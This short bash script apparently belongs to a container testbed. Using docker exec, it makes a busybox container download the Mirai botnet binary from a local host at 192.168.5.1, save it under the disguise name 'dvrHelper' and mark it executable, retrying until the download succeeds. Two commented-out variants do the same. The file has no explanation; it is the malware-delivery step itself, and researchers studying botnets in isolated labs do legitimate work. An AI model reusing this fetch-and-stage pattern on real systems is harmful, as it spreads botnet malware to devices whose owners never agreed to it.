#!/bin/bash
#docker exec -w / -it bb$1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
#docker exec -w / bb$1 sh -c "/bin/busybox wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; /bin/busybox chmod 777 ./dvrHelper"
docker exec -w / bb$1 sh -c "until wget http://192.168.5.1/bins/mirai.x86 -O - > ./dvrHelper; do sleep 5s; done; /bin/busybox chmod 777 ./dvrHelper"
